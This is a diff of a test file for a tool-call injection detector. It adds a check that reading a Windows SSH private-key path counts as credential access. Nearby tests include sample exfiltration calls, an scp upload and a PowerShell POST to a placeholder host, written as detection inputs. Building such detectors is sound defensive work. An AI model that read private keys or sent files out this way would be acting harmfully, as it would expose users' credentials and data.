@@ -18,6 +18,7 @@ describe('injection detector', () => {
   it('recognizes common alternate network exfiltration tools', () => { expect(classifySink('pwsh', 'Invoke-WebRequest https://example.invalid -Method POST').map(s => s.type)).toContain('network'); expect(classifySink('scp', 'fake.txt user@example.invalid:/tmp').map(s => s.type)).toContain('network') })
   it('fails closed on unserializable arguments without throwing', () => { const circular: Record<string, unknown> = {}; circular.self = circular; expect(() => classifySink('tool', circular)).not.toThrow() })
   it('does not classify ordinary credential-related documentation as a secret sink', () => { expect(classifySink('filesystem.read', { path: 'docs/password-reset-guide.md' }).map(s => s.type)).not.toContain('credential-access'); expect(detectInjection('This document explains password and token rotation.')).not.toContainEqual(expect.objectContaining({ type: 'secret-access' })) })
+  it('classifies Windows absolute SSH private-key paths as credential access', () => { expect(classifySink('read', { path: 'C:\\Users\\李现\\.ssh\\id_rsa' }).map(s => s.type)).toContain('credential-access') })
   it('survives hostile and malformed argument values', () => {
     const throwing = { toJSON() { throw new Error('boom') }, toString() { throw new Error('boom') } }
     const values: unknown[] = [null, undefined, 1, Symbol('arg'), Object.create(null), throwing]
